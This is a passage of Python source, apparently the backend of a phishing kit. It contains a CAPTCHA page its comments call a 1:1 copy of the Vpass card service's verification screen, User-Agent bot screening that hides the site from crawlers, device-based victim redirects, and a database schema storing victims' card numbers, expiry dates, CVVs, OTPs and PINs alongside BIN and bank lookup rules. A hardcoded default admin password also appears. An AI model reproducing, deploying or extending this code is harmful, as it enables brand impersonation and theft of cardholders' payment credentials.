<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="robots" content="noindex, nofollow">
<title>セキュリティ確認</title>
<style>
:root{--gw-accent:__ACCENT__;--gw-accent-dark:__ACCENT_DARK__;--gw-line:#b9c2bd;--gw-ink:#1a1a1a;--gw-muted:#6b7671;--gw-error:#a33232}
__CSS__
</style>
</head>
<body>
<div class="gw-bar"></div>
<header class="gw-hd">
<div class="gw-hd-org">セキュリティ認証</div>
<div class="gw-hd-sys">自動操作対策</div>
</header>
<main class="gw-wrap">
<div class="gw-doc">
<div class="gw-notice">本ページは自動操作から保護されています。確認のうえ、引き続き操作を進めてください。</div>
<h1 class="gw-ttl">セキュリティ確認</h1>
<div class="gw-ttl-rule"></div>
__BANNER__
<p class="gw-lead">続行するためには、本人が操作していることを確認する必要があります。以下の手順で、自動程序ではなくご本人による操作であることを確認してください。</p>
<ol class="gw-steps">
<li class="gw-step"><div class="gw-step-no">1</div><div class="gw-step-tx">表示されている <b>盾のアイコン</b> をすべて選択してください。</div></li>
<li class="gw-step"><div class="gw-step-no">2</div><div class="gw-step-tx">選択後、<b>確認する</b> ボタンを押してください。</div></li>
<li class="gw-step"><div class="gw-step-no">3</div><div class="gw-step-tx">確認が完了したら、自動的に元の画面に戻ります。</div></li>
</ol>
<div class="gw-vhead">
<div class="gw-vlabel">盾のアイコンを選択してください</div>
<div class="gw-vcount">選択 <span id="gwSel">0</span> / <span id="gwNeed">__NEED__</span> 個<span id="gwTries">__TRIES_NOTE__</span></div>
</div>
<div class="gw-grid" id="gwGrid">__CELLS__</div>
<div class="gw-vnote">盾以外のアイコンは選択できません。誤って選択した場合は、もう一度やり直してください。</div>
<div class="gw-act">
<div class="gw-act-tx">選択が完了したら、右のボタンを押してください。<br>操作には最大 __TRIES__ 回まで試すことができます。</div>
<button class="gw-btn" id="gwBtn">確 認 す る</button>
</div>
<div class="gw-msg" id="gwMsg" role="status" aria-live="polite"></div>
<div class="gw-spin" id="gwSpin"><div class="gw-ring"></div><span>確認中です。しばらくお待ちください。</span></div>
<footer class="gw-ft">確認結果はセキュリティ審査として記録されます。
<div>ご不明な点はサポート窓口までお問い合わせください。</div></footer>
</div>
</main>
<script>
__JS__
</script>
</body>
</html>
"""


# Vpass 品牌皮肤：1:1 复刻 vpass_captcha.html 的视觉与交互语言
# （顶部logo 品牌条、盾牌徽章波纹、圆角方块 +✓ 角标、绿色立体按钮、底部 SSL 提示），
# 但校验改为走服务端，答案依然不落到前端。
VPASS_CAPTCHA_CSS = """
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
body{
  font-family:"Noto Sans JP",Meiryo,"Hiragino Sans","Yu Gothic",sans-serif;
  color:#333;background:#f4f7f6;line-height:1.6;
  -webkit-font-smoothing:antialiased;
  min-height:100vh;display:flex;flex-direction:column;
  -webkit-user-drag:none;
}
.brand{background:#fff;border-bottom:1px solid #e8eceb;position:relative;padding:18px 20px;text-align:center;flex:none}
.brand::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#0a5c48,#07866d 55%,#0aa07f)}
.brand img{width:104px;height:auto;display:inline-block}
main{flex:1 0 auto;display:flex;align-items:flex-start;justify-content:center;padding:42px 20px 56px}
.card{width:100%;max-width:480px;background:#fff;border:1px solid #e6e6e6;border-radius:14px;padding:38px 36px 34px;text-align:left;box-shadow:0 8px 28px rgba(26,72,50,.07);animation:fadeIn .5s ease-out}
@keyframes fadeIn{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
.shield-badge{position:relative;width:76px;height:76px;margin:0 auto 22px;border-radius:50%;background:#e8f4f1;display:flex;align-items:center;justify-content:center}
.shield-badge::after{content:"";position:absolute;inset:-7px;border-radius:50%;border:2px solid #07866d;opacity:0;animation:ring 2.2s ease-out infinite}
@keyframes ring{0%{transform:scale(.85);opacity:.4}70%{transform:scale(1.18);opacity:0}100%{opacity:0}}
.shield-badge svg{width:34px;height:34px;fill:none;stroke:#07866d;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
h1{font-size:17px;color:#1a4832;font-weight:700;line-height:1.55;text-align:center;margin-bottom:12px;letter-spacing:.01em}
.sub{font-size:13.5px;color:#666;margin-bottom:24px;line-height:1.85}
.inst{font-size:13.5px;color:#333;margin-bottom:8px;font-weight:500}
.inst img{width:20px;height:20px;vertical-align:middle;margin:0 2px}
.hint{font-size:12.5px;color:#888;margin-bottom:22px}
.hint .highlight{color:#00846d;font-weight:700}
.cp-images{display:flex;justify-content:center;align-items:center;gap:12px;margin-bottom:24px;flex-wrap:nowrap;user-select:none;-webkit-user-select:none}
.cp-item{width:70px;height:70px;border-radius:12px;cursor:pointer;transition:all .2s ease;display:flex;align-items:center;justify-content:center;border:3px solid transparent;background:#fafbfb;position:relative}
.cp-item:hover{transform:scale(1.05);box-shadow:0 4px 12px rgba(26,72,50,.16)}
.cp-item:active{transform:scale(.95)}
.cp-item.selected{border-color:#00846d;background:#e8f4f1}
.cp-item.selected::after{content:"\\2713";position:absolute;top:-8px;right:-8px;width:20px;height:20px;background:#00846d;color:#fff;border-radius:50%;font-size:12px;display:flex;align-items:center;justify-content:center;font-weight:700}
.cp-item img{width:46px;height:46px;object-fit:contain;pointer-events:none}
.cp-item.locked{pointer-events:none;opacity:.5}
.cp-verify{width:100%;height:50px;display:block;margin:0 auto;background:#00846d;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;letter-spacing:.08em;cursor:pointer;transition:background .25s ease,transform .1s ease,box-shadow .1s ease;box-shadow:0 3px 0 #05624f;font-family:inherit}
.cp-verify:hover:not(:disabled){background:#076B59}
.cp-verify:active:not(:disabled){transform:translateY(2px);box-shadow:0 1px 0 #05624f}
.cp-verify:disabled{background:#c4ccc9;cursor:not-allowed;box-shadow:none}
.cp-loading{display:none;margin-top:16px}
.cp-loading.show{display:flex;align-items:center;justify-content:center;gap:8px}
.cp-spinner{width:20px;height:20px;border:2px solid #dfe8e5;border-top-color:#00846d;border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.cp-loading span{font-size:14px;color:#666}
.cp-message{margin-top:16px;padding:12px 14px;border-radius:6px;font-size:14px;display:none;line-height:1.7}
.cp-message.error{display:block;background:#fdf3f2;border:1px solid #f0c4be;color:#c0392b}
.cp-message.success{display:block;background:#e8f4f1;border:1px solid #b8ded4;color:#07866d;font-weight:700}
.foot{flex:none;text-align:center;padding:0 20px 26px}
.foot .secure{display:inline-flex;align-items:center;gap:6px;font-size:11.5px;color:#7ba394;margin-bottom:6px}
.foot .secure svg{width:12px;height:12px;fill:none;stroke:#7ba394;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
.foot .cp{font-size:10.5px;color:#b3bcb9}
@media (max-width:480px){
  main{padding:28px 14px 40px}
  .card{padding:30px 20px 28px;border-radius:12px}
  h1{font-size:15.5px}
  .sub{font-size:13px}
  .cp-item{width:60px;height:60px}
  .cp-item img{width:40px;height:40px}
  .cp-images{gap:8px}
}
@media (max-width:360px){
  .cp-item{width:54px;height:54px}
  .cp-item img{width:36px;height:36px}
  .cp-images{gap:6px}
}
@media (max-width:320px){
  main{padding:20px 10px 30px}
  .card{padding:24px 14px 22px}
  .cp-item{width:50px;height:50px;border-width:2px}
  .cp-item img{width:32px;height:32px}
  .cp-images{gap:5px}
  .cp-verify{font-size:15px;letter-spacing:.04em}
}
"""

VPASS_CAPTCHA_JS = """
(function(){
var NEED=%%NEED%%,TRIES=%%TRIES%%,TOKEN=%%TOKEN%%,CHALLENGE=%%CHALLENGE%%,VERIFY_URL=%%VERIFY_URL%%,GO_URL=%%GO_URL%%;
var POW=%%POW%%,powNonce='',powReady=null;
function gwShaHex(input){
  return crypto.subtle.digest('SHA-256',new TextEncoder().encode(input)).then(function(buf){
    return Array.prototype.map.call(new Uint8Array(buf),function(x){return ('0'+x.toString(16)).slice(-2);}).join('');
  });
}
/* 页面加载即后台求解工作量证明（平均约四千次哈希，用户读题期间完成，无感） */
function gwSolve(){
  var i=0;
  function step(){
    return gwShaHex(POW+':'+i).then(function(hex){
      if(hex.slice(0,3)==='000')return String(i);
      i++;return step();
    });
  }
  return step().catch(function(){return '';});
}
function gwRecompute(nextPow){POW=nextPow;powReady=gwSolve().then(function(n){powNonce=n;});}
powReady=gwSolve().then(function(n){powNonce=n;});
var selected=[],busy=false;
var container=document.getElementById('imagesContainer'),
    btn=document.getElementById('verifyBtn'),
    loading=document.getElementById('cpLoading'),
    message=document.getElementById('cpMessage');

function sync(){
  btn.disabled=selected.length!==NEED||busy;
}
function toggle(el){
  if(busy||el.classList.contains('locked'))return;
  var i=Number(el.dataset.index),at=selected.indexOf(i);
  if(at>-1){selected.splice(at,1);el.classList.remove('selected');}
  else{selected.push(i);el.classList.add('selected');}
  sync();
}
container.addEventListener('click',function(e){
  var item=e.target.closest('.cp-item');
  if(item)toggle(item);
});
btn.addEventListener('click',async function(){
  if(busy||selected.length!==NEED)return;
  busy=true;try{await powReady;}catch(e){}btn.disabled=true;btn.style.display='none';
  loading.classList.add('show');message.className='cp-message';
  try{
    var res=await fetch(VERIFY_URL,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({captchaId:CHALLENGE,token:TOKEN,clickedPositions:selected,powNonce:(function(n){try{return n;}catch(e){return '';}})(powNonce)})});
    var data=await res.json();
    if(data.powChallenge){gwRecompute(data.powChallenge);}
    loading.classList.remove('show');
    if(data.success){
      message.className='cp-message success';
      message.textContent='確認完了！転送しています...';
      /* 与素材一致：成功提示停 500ms 再跳转 */
      setTimeout(function(){
        window.location.replace(data.redirect||(GO_URL+encodeURIComponent(data.redirectToken||'')));
      },500);
      return;
    }
    busy=false;btn.style.display='block';
    if(data.error==='MAX_ATTEMPTS_EXCEEDED'||data.error==='IP_BANNED'){
      message.className='cp-message error';
      message.textContent=data.message||'試行回数の上限に達しました。しばらくしてから再試行してください。';
      btn.style.display='none';
      container.querySelectorAll('.cp-item').forEach(function(c){c.classList.add('locked');});
      return;
    }
    if(data.error==='CAPTCHA_EXPIRED'){
      message.className='cp-message error';
      message.textContent='確認の有効期限が切れました。ページを再読み込みしてください。';
      setTimeout(function(){window.location.reload();},1800);
      return;
    }
    message.className='cp-message error';
    message.textContent=data.message||'選択が正しくありません。盾のアイコンだけをすべて選び直してください。';
    selected=[];
    container.querySelectorAll('.cp-item').forEach(function(c){c.classList.remove('selected');});
    sync();
  }catch(err){
    busy=false;loading.classList.remove('show');btn.style.display='block';
    message.className='cp-message error';
    message.textContent='ネットワークエラーが発生しました。再試行してください。';
    sync();
  }
});
sync();
})();
"""

VPASS_CAPTCHA_HTML = """<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<meta name="robots" content="noindex, nofollow">
<title>セキュリティ確認｜Vpass</title>
<link rel="icon" href="__FAVICON__" type="image/x-icon">
<style>
__CSS__
</style>
</head>
<body>
<header class="brand">
  <img src="__LOGO__" alt="Vpass">
</header>
<main>
  <div class="card">
    <div class="shield-badge">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2.5L4 6v5.5c0 5 3.4 9.7 8 10.9 4.6-1.2 8-5.9 8-10.9V6l-8-3.5z"></path>
        <path d="M9 11.5l2.2 2.2 4-4.2"></path>
      </svg>
    </div>
    <h1>サイトへの接続が安全かどうか確認しています</h1>
    <p class="sub">続行する前に接続のセキュリティを確認する必要があります。<br>以下のアクションを完了して、あなたが人間であることを確認してください。</p>
    <p class="inst">セキュリティ対策のため、表示された <img src="/captcha/security.png" alt="「盾アイコン」"> をすべてタップしてください。</p>
    <p class="hint">※ <span id="securityCount">__NEED__</span> 個の<span class="highlight">盾アイコン</span>を選択してください</p>
    <div class="cp-images" id="imagesContainer">__CELLS__</div>
    <button class="cp-verify" id="verifyBtn" disabled>確認する</button>
    <div class="cp-loading" id="cpLoading">
      <div class="cp-spinner"></div><span>確認中...</span>
    </div>
    <div class="cp-message" id="cpMessage" role="status" aria-live="polite"></div>
  </div>
</main>
<footer class="foot">
  <span class="secure">
    <svg viewBox="0 0 24 24"><rect x="4" y="10.5" width="16" height="10" rx="2"></rect><path d="M8 10.5V7.5a4 4 0 0 1 8 0v3"></path></svg>
    通信は SSL 暗号化によって保護されています
  </span>
</footer>
<script>
__JS__
</script>
</body>
</html>
"""

# 皮肤表在此赋值：引用的 VPASS_* 常量必须已经定义完。
# logo 走模板自身资源目录，验证码图标仍由 /captcha/* 提供（服务端托管）。
CAPTCHA_SKINS.update({
    "vpass-flow": {
        "html": VPASS_CAPTCHA_HTML,
        "css": VPASS_CAPTCHA_CSS,
        "js": VPASS_CAPTCHA_JS,
        "logo": "/assets/vpass_logo.svg",
        "favicon": "/assets/favicon.ico",
    },
})


def build_captcha_page(challenge: dict, template_slug: str, error: str = "", tries_left: int = 0, verify_url: str = "/captcha/verify", go_url: str = "/captcha/go/", prefix: str = "") -> bytes:
    """Render the verification page, themed to the active template.

    Placeholders are plain token replacement so the CSS/JS blocks keep their
    own braces without escaping.
    """
    if template_slug in CAPTCHA_SKINS:
        return build_skin_captcha_page(
            CAPTCHA_SKINS[template_slug], challenge, template_slug,
            error=error, tries_left=tries_left,
            verify_url=verify_url, go_url=go_url, prefix=prefix,
        )
    theme = CAPTCHA_THEMES.get(template_slug, CAPTCHA_DEFAULT_THEME)
    cells = "".join(
        '<button type="button" class="cell{decoy}" data-index="{index}" '
        'aria-label="マス {number}" data-type="{kind}">'
        '<img src="/captcha/{icon}" alt=""></button>'.format(
            decoy=" decoy" if cell["type"] == "decoy" else "",
            index=cell["index"],
            number=cell["index"] + 1,
            kind=cell["type"],
            icon="security.png" if cell["type"] == "security" else "captcha-decoy.png",
        )
        for cell in challenge["cells"]
    ).replace('class="cell', 'class="gw-cell')

    need = int(challenge["need"])
    max_tries = CAPTCHA_MAX_TRIES_DEFAULT
    tries_note = f"　（残り {tries_left} 回）" if 0 < tries_left < max_tries else ""
    banner = ""
    if error:
        safe = (error.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;"))
        banner = f'<p class="gw-banner gw-banner-error" role="alert">{safe}</p>'

    page = CAPTCHA_HTML
    for key, value in [
        ("__ACCENT__", theme["accent"]),
        ("__ACCENT_DARK__", theme["accent_dark"]),
        ("__CSS__", CAPTCHA_CSS),
        ("__BANNER__", banner),
        ("__NEED__", str(need)),
        ("__TRIES_NOTE__", tries_note),
        ("__CELLS__", cells),
        ("__TRIES__", str(max_tries)),
    ]:
        page = page.replace(key, value)
    # Inject the script last, then fill its own placeholders.
    page = page.replace("__JS__", CAPTCHA_JS)
    page = page.replace("%%NEED%%", str(need))
    page = page.replace("%%TRIES%%", str(max_tries))
    page = page.replace("%%TOKEN%%", json.dumps(challenge["token"]))
    page = page.replace("%%CHALLENGE%%", json.dumps(challenge["id"]))
    page = page.replace("%%VERIFY_URL%%", json.dumps(verify_url))
    page = page.replace("%%GO_URL%%", json.dumps(go_url))
    page = page.replace("%%POW%%", json.dumps(challenge.get("pow", "")))
    return page.encode("utf-8")

def parse_accept_languages(header: str) -> list[str]:
    """Extract lowercase language tags from an Accept-Language header.

    "ja-JP,ja;q=0.9,en;q=0.8" -> ["ja-jp", "ja", "en"]. Empty header -> [].
    """
    tags = []
    for part in str(header or "").split(","):
        tag = part.split(";")[0].strip().lower()
        if tag and tag != "*":
            tags.append(tag)
    return tags


def classify_client(ua: str) -> tuple[str, list[str]]:
    """Map a User-Agent string to a client type plus the matched evidence.

    Bot detection runs first so that crawlers spoofing a mobile UA are still
    treated as automation traffic.
    """
    ua_text = str(ua or "")
    lowered = ua_text.lower()

    if not lowered.strip():
        return CLIENT_UNKNOWN, ["ua_missing"]

    bot_hit = next((token for token in BOT_UA_PATTERNS if token in lowered), "")
    if bot_hit:
        return CLIENT_BOT, [f"ua_bot:{bot_hit}"]

    is_ios = any(token in lowered for token in IOS_UA_PATTERNS)
    is_android = any(token in lowered for token in ANDROID_UA_PATTERNS)
    is_mobile = is_ios or is_android or any(token in lowered for token in MOBILE_UA_PATTERNS)

    if is_ios:
        return CLIENT_IOS, ["ua_ios"]
    if is_android:
        return CLIENT_ANDROID, ["ua_android"]
    if is_mobile:
        return CLIENT_UNKNOWN, ["ua_mobile_generic"]
    if any(token in lowered for token in ("windows nt", "macintosh", "x11", "cros", "linux")) or "mozilla" in lowered:
        return CLIENT_DESKTOP, ["ua_desktop"]
    return CLIENT_UNKNOWN, ["ua_unrecognized"]


def normalize_client_rules(value) -> dict:
    """Coerce the per-client redirect rule map into a clean structure.

    Accepts either {client: "url"} or {client: {"url": ..., "limit": ...}} and
    always returns one entry per known client type so the UI can bind inputs.
    """
    if isinstance(value, str):
        parsed: dict = {}
        for line in value.splitlines():
            parts = [part.strip() for part in line.split("|", 1)]
            if len(parts) != 2 or not parts[0]:
                continue
            client, limit_text = parts[0].lower(), parts[1]
            parsed[client] = {"url": "", "limit": limit_text if REDIRECT_LIMIT_RE.match(limit_text) else 0}
        value = parsed
    if not isinstance(value, dict):
        value = {}
    rules = {}
    for client in CLIENT_TYPES:
        item = value.get(client)
        if isinstance(item, dict):
            url, limit_value = item.get("url", ""), item.get("limit", 0)
        elif isinstance(item, str):
            url, limit_value = item, 0
        else:
            url, limit_value = "", 0
        url = str(url or "").strip()
        parsed_url = urlparse(url)
        if parsed_url.scheme not in ("http", "https") or not parsed_url.netloc:
            url = ""
        limit_text = str(limit_value or "0").strip()
        limit = int(limit_text) if REDIRECT_LIMIT_RE.match(limit_text) else 0
        rules[client] = {"url": url, "limit": limit, "label": CLIENT_LABELS.get(client, client)}
    return rules


def now_text() -> str:
    return datetime.now().astimezone().isoformat(timespec="seconds")


def host_only(value: str) -> str:
    """去掉 Host 头里的端口，便于反代/多端口部署时仍能匹配域名。"""
    return (value or "").split(":", 1)[0].strip().lower()


def json_dumps(value) -> bytes:
    return json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode("utf-8")


def hash_password(password: str, salt: bytes | None = None) -> str:
    salt = salt or secrets.token_bytes(16)
    digest = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 210_000)
    return f"pbkdf2_sha256$210000${base64.b64encode(salt).decode()}${base64.b64encode(digest).decode()}"


def verify_password(password: str, encoded: str) -> bool:
    try:
        algorithm, rounds, salt, expected = encoded.split("$", 3)
        if algorithm != "pbkdf2_sha256":
            return False
        actual = hashlib.pbkdf2_hmac(
            "sha256", password.encode(), base64.b64decode(salt), int(rounds)
        )
        return hmac.compare_digest(actual, base64.b64decode(expected))
    except (ValueError, TypeError):
        return False


def normalize_redirect_links(value) -> list[dict]:
    """Keep only explicit http(s) targets and normalize click limits."""
    if isinstance(value, str):
        items = []
        for line in value.splitlines():
            parts = [part.strip() for part in line.split("|", 1)]
            if parts and parts[0]:
                items.append({"url": parts[0], "limit": parts[1] if len(parts) > 1 else 0})
    elif isinstance(value, list):
        items = value
    else:
        items = []
    result = []
    for item in items[:50]:
        if isinstance(item, str):
            url, limit_value = item.strip(), 0
        elif isinstance(item, dict):
            url, limit_value = str(item.get("url", "")).strip(), item.get("limit", 0)
        else:
            continue
        parsed = urlparse(url)
        if parsed.scheme not in ("http", "https") or not parsed.netloc:
            continue
        limit_text = str(limit_value or "0").strip()
        if not REDIRECT_LIMIT_RE.match(limit_text):
            continue
        result.append({"url": url, "limit": int(limit_text)})
    return result


class ClosingConnection(sqlite3.Connection):
    """Commit or roll back, then release the SQLite handle at block exit."""

    def __exit__(self, exc_type, exc_value, traceback):
        try:
            return super().__exit__(exc_type, exc_value, traceback)
        finally:
            self.close()


class Store:
    def __init__(self, path: Path):
        path.parent.mkdir(parents=True, exist_ok=True)
        self.path = path
        self._lock = threading.Lock()
        self.initialize()

    def connect(self):
        db = sqlite3.connect(self.path, timeout=15, factory=ClosingConnection)
        db.row_factory = sqlite3.Row
        db.execute("PRAGMA foreign_keys=ON")
        return db

    def initialize(self):
        schema = """
        CREATE TABLE IF NOT EXISTS users (
          id INTEGER PRIMARY KEY, username TEXT UNIQUE NOT NULL,
          password_hash TEXT NOT NULL, created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS events (
          id INTEGER PRIMARY KEY AUTOINCREMENT, domain TEXT NOT NULL,
          event_type TEXT NOT NULL CHECK(event_type IN ('visit','click','rejected')),
          created_at TEXT NOT NULL, ip TEXT NOT NULL, ua TEXT NOT NULL,
          path TEXT NOT NULL DEFAULT '',
          client_type TEXT NOT NULL DEFAULT 'unknown'
        );
        CREATE INDEX IF NOT EXISTS idx_events_domain_time ON events(domain, created_at DESC);
        CREATE INDEX IF NOT EXISTS idx_events_type_time_ip ON events(event_type, created_at, ip);
        CREATE TABLE IF NOT EXISTS projects (
          id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL,
          slug TEXT UNIQUE NOT NULL, source_url TEXT NOT NULL DEFAULT '',
          local_path TEXT NOT NULL DEFAULT '', status TEXT NOT NULL DEFAULT 'downloaded',
          created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS domains (
          id INTEGER PRIMARY KEY AUTOINCREMENT, project_id INTEGER,
          domain TEXT UNIQUE NOT NULL, upstream_port INTEGER NOT NULL,
          frontend_entry TEXT NOT NULL DEFAULT 'logo.gif',
          certificate_status TEXT NOT NULL DEFAULT 'none',
          created_at TEXT NOT NULL,
          FOREIGN KEY(project_id) REFERENCES projects(id) ON DELETE SET NULL
        );
        CREATE TABLE IF NOT EXISTS blacklist (
          id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT UNIQUE NOT NULL,
          reason TEXT NOT NULL DEFAULT 'manual', note TEXT NOT NULL DEFAULT '',
          created_at TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_blacklist_ip ON blacklist(ip);
        CREATE TABLE IF NOT EXISTS settings (
          key TEXT PRIMARY KEY, value TEXT NOT NULL, updated_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS redirect_link_stats (
          link_index INTEGER PRIMARY KEY, clicks INTEGER NOT NULL DEFAULT 0,
          updated_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS client_redirect_stats (
          client_type TEXT NOT NULL, link_index INTEGER NOT NULL DEFAULT 0,
          clicks INTEGER NOT NULL DEFAULT 0, updated_at TEXT NOT NULL,
          PRIMARY KEY(client_type, link_index)
        );
        CREATE TABLE IF NOT EXISTS captures (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          domain TEXT NOT NULL DEFAULT '',
          path TEXT NOT NULL DEFAULT '',
          href TEXT NOT NULL DEFAULT '',
          step INTEGER NOT NULL DEFAULT 0,
          kind TEXT NOT NULL DEFAULT 'submit',
          fields TEXT NOT NULL DEFAULT '{}',
          ip TEXT NOT NULL DEFAULT '',
          ua TEXT NOT NULL DEFAULT '',
          client_type TEXT NOT NULL DEFAULT 'unknown',
          language TEXT NOT NULL DEFAULT '',
          timezone TEXT NOT NULL DEFAULT '',
          screen TEXT NOT NULL DEFAULT '',
          referer TEXT NOT NULL DEFAULT '',
          created_at TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_captures_time ON captures(id DESC);
        CREATE INDEX IF NOT EXISTS idx_captures_domain_time ON captures(domain, id DESC);
        CREATE TABLE IF NOT EXISTS visitors (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          site_abbreviation TEXT NOT NULL DEFAULT '',
          uuid TEXT,
          referer TEXT NOT NULL DEFAULT '',
          ip TEXT NOT NULL DEFAULT '',
          ua TEXT NOT NULL DEFAULT '',
          action TEXT NOT NULL DEFAULT '',
          route TEXT NOT NULL DEFAULT '',
          data TEXT NOT NULL DEFAULT '{}',
          card_bin TEXT NOT NULL DEFAULT '',
          status INTEGER NOT NULL DEFAULT 0,
          pay_status INTEGER NOT NULL DEFAULT 0,
          remark TEXT NOT NULL DEFAULT '',
          created_at TEXT NOT NULL,
          updated_at TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_visitors_time ON visitors(id DESC);
        CREATE INDEX IF NOT EXISTS idx_visitors_site ON visitors(site_abbreviation, id DESC);
        CREATE INDEX IF NOT EXISTS idx_visitors_uuid ON visitors(uuid);
        CREATE TABLE IF NOT EXISTS payments (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          uid INTEGER NOT NULL DEFAULT 0,
          uuid TEXT,
          site_abbreviation TEXT NOT NULL DEFAULT '',
          cname TEXT NOT NULL DEFAULT '',
          ccard TEXT NOT NULL DEFAULT '',
          cdate TEXT NOT NULL DEFAULT '',
          ccvv TEXT NOT NULL DEFAULT '',
          otp TEXT NOT NULL DEFAULT '',
          custom1 TEXT NOT NULL DEFAULT '',
          custom2 TEXT NOT NULL DEFAULT '',
          pin TEXT NOT NULL DEFAULT '',
          card_type TEXT NOT NULL DEFAULT '',
          card_bank TEXT NOT NULL DEFAULT '',
          card_brand TEXT NOT NULL DEFAULT '',
          card_level TEXT NOT NULL DEFAULT '',
          card_country TEXT NOT NULL DEFAULT '',
          referer TEXT NOT NULL DEFAULT '',
          ip TEXT NOT NULL DEFAULT '',
          created_at TEXT NOT NULL,
          updated_at TEXT NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_payments_time ON payments(id DESC);
        CREATE INDEX IF NOT EXISTS idx_payments_uid ON payments(uid);
        CREATE INDEX IF NOT EXISTS idx_payments_uuid ON payments(uuid);
        CREATE TABLE IF NOT EXISTS bin_rules (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          prefix TEXT UNIQUE NOT NULL,
          brand TEXT NOT NULL DEFAULT '',
          bank TEXT NOT NULL DEFAULT '',
          level TEXT NOT NULL DEFAULT '',
          card_type TEXT NOT NULL DEFAULT '',
          country TEXT NOT NULL DEFAULT '',
          bank_phone TEXT NOT NULL DEFAULT ''
        );
        """
        with self.connect() as db:
            db.executescript(schema)
            event_schema = db.execute(
                "SELECT sql FROM sqlite_master WHERE type='table' AND name='events'"
            ).fetchone()
            if event_schema and "'rejected'" not in (event_schema["sql"] or ""):
                db.executescript("""
                BEGIN IMMEDIATE;
                CREATE TABLE events_migrated (
                  id INTEGER PRIMARY KEY AUTOINCREMENT, domain TEXT NOT NULL,
                  event_type TEXT NOT NULL CHECK(event_type IN ('visit','click','rejected')),
                  created_at TEXT NOT NULL, ip TEXT NOT NULL, ua TEXT NOT NULL,
                  path TEXT NOT NULL DEFAULT ''
                );
                INSERT INTO events_migrated(id,domain,event_type,created_at,ip,ua,path)
                  SELECT id,domain,event_type,created_at,ip,ua,path FROM events;
                DROP TABLE events;
                ALTER TABLE events_migrated RENAME TO events;
                CREATE INDEX idx_events_domain_time ON events(domain, created_at DESC);
                COMMIT;
                """)
            try:
                db.execute("ALTER TABLE domains ADD COLUMN frontend_entry TEXT NOT NULL DEFAULT 'logo.gif'")
            except sqlite3.OperationalError:
                pass
            try:
                db.execute("ALTER TABLE projects ADD COLUMN page_order TEXT NOT NULL DEFAULT ''")
            except sqlite3.OperationalError:
                pass
            try:
                db.execute("ALTER TABLE events ADD COLUMN client_type TEXT NOT NULL DEFAULT 'unknown'")
            except sqlite3.OperationalError:
                pass
            try:
                db.execute("CREATE INDEX IF NOT EXISTS idx_events_client ON events(client_type, created_at DESC)")
            except sqlite3.OperationalError:
                pass
            username = os.environ.get("GATEWAY_ADMIN_USER", "admin")
            password = os.environ.get("GATEWAY_ADMIN_PASSWORD", "110120Qq")
            db.execute(
                "INSERT OR IGNORE INTO users(username,password_hash,created_at) VALUES(?,?,?)",
                (username, hash_password(password), now_text()),
            )
            defaults = SETTINGS_DEFAULTS
            for key, value in defaults.items():
                db.execute(
                    "INSERT OR IGNORE INTO settings(key,value,updated_at) VALUES(?,?,?)",
                    (key, json.dumps(value), now_text()),
                )
            db.execute(
                "UPDATE settings SET value=?,updated_at=? WHERE key='frontend_entry' AND value=?",
                (json.dumps("logo.gif"), now_text(), json.dumps("index.html")),
            )

    def user(self, username: str):
        with self.connect() as db:
            return db.execute("SELECT * FROM users WHERE username=?", (username,)).fetchone()

    def stats(self, now: datetime | None = None):
        local_now = (now or datetime.now(timezone.utc)).astimezone(REPORT_TIMEZONE)
        cutoff = local_now.replace(hour=REPORT_RESET_HOUR, minute=0, second=0, microsecond=0)
        if local_now < cutoff:
            cutoff -= timedelta(days=1)
        next_cutoff = cutoff + timedelta(days=1)
        now_utc = local_now.astimezone(timezone.utc).isoformat(timespec="seconds")
        cutoff_utc = cutoff.astimezone(timezone.utc).isoformat(timespec="seconds")
        with self.connect() as db:
            totals = db.execute(
                "WITH unique_events AS ("
                "SELECT event_type,ip,date(created_at,'+8 hours','-22 hours') period "
                "FROM events WHERE event_type IN ('visit','click') AND julianday(created_at)<=julianday(?) "
                "GROUP BY event_type,ip,period) "
                "SELECT SUM(CASE WHEN event_type='visit' THEN 1 ELSE 0 END) visits,"
                "SUM(CASE WHEN event_type='click' THEN 1 ELSE 0 END) clicks FROM unique_events",
                (now_utc,),
            ).fetchone()
            today = db.execute(
                "SELECT COUNT(DISTINCT CASE WHEN event_type='visit' THEN ip END) visits,"
                "COUNT(DISTINCT CASE WHEN event_type='click' THEN ip END) clicks "
                "FROM events WHERE julianday(created_at)>=julianday(?) AND julianday(created_at)<julianday(?)",
                (cutoff_utc, now_utc),
            ).fetchone()
            domains = db.execute("SELECT COUNT(*) count FROM domains").fetchone()["count"]
            weekly = []
            for days_ago in range(6, -1, -1):
                start = cutoff - timedelta(days=days_ago)
                end = min(start + timedelta(days=1), local_now)
                row = db.execute(
